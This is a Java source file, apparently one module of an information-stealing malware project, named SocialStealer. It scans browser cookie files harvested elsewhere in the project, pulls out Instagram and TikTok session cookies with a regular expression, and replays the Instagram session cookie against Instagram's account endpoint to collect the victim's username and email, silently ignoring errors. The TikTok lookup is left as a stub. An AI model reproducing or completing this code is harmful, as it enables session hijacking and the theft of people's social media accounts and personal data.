package itzgonza.hollyshit.impl.app;

import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.io.FileUtils;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import itzgonza.hollyshit.utils.utilities;

public class SocialStealer extends utilities {

    public static List<SocialAccount> instagramAccounts = new ArrayList<>();
    public static List<SocialAccount> tiktokAccounts = new ArrayList<>();

    @Override
    public void initialize() throws Exception {
        // This is called in parallel by startup.java
        // We will process cookies gathered by DecryptManager
        processGatheredSocials();
    }

    private void processGatheredSocials() {
        try {
            File browserDataDir = new File(getPath(), "Browser_datas2");
            if (!browserDataDir.exists()) return;

            // Search for cookies files in all browser profiles
            Collection<File> cookieFiles = FileUtils.listFiles(browserDataDir, new String[]{"txt"}, true);
            for (File f : cookieFiles) {
                if (f.getName().equals("cookies.txt")) {
                    String content = FileUtils.readFileToString(f, "UTF-8");
                    checkInstagram(content);
                    checkTikTok(content);
                }
            }
        } catch (Exception ignored) {}
    }

    private void checkInstagram(String cookies) {
        String sessionid = extractCookie(cookies, "instagram.com", "sessionid");
        if (sessionid != null) {
            SocialAccount acc = fetchInstagramStats(sessionid);
            if (acc != null) instagramAccounts.add(acc);
        }
    }

    private void checkTikTok(String cookies) {
        String sessionid = extractCookie(cookies, "tiktok.com", "sid_tt");
        if (sessionid != null) {
            SocialAccount acc = fetchTikTokStats(sessionid);
            if (acc != null) tiktokAccounts.add(acc);
        }
    }

    private String extractCookie(String content, String domain, String name) {
        // Netscape format: domain TRUE / FALSE 2597573456 name value
        Pattern p = Pattern.compile(".*" + domain.replace(".", "\\.") + ".*" + name + "\\t([^\\s]+)");
        Matcher m = p.matcher(content);
        if (m.find()) return m.group(1);
        return null;
    }

    private SocialAccount fetchInstagramStats(String sessionid) {
        try {
            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder()
                    .url("https://www.instagram.com/accounts/edit/?__a=1")
                    .addHeader("Cookie", "sessionid=" + sessionid)
                    .addHeader("User-Agent", "Mozilla/5.0")
                    .build();

            try (Response response = client.newCall(request).execute()) {
                if (response.isSuccessful()) {
                    JsonObject json = JsonParser.parseString(response.body().string()).getAsJsonObject();
                    JsonObject user = json.getAsJsonObject("form_data");
                    SocialAccount acc = new SocialAccount();
                    acc.username = user.get("username").getAsString();
                    acc.email = user.get("email").getAsString();
                    // Extra fetch for followers if needed, but this is a good start
                    return acc;
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    private SocialAccount fetchTikTokStats(String sessionid) {
        // Implementation for TikTok stats fetch
        return null; 
    }

    public static class SocialAccount {
        public String username;
        public String email;
        public String followers = "0";
        public String following = "0";
        public String posts = "0";
        public String balance = "0";
    }
}
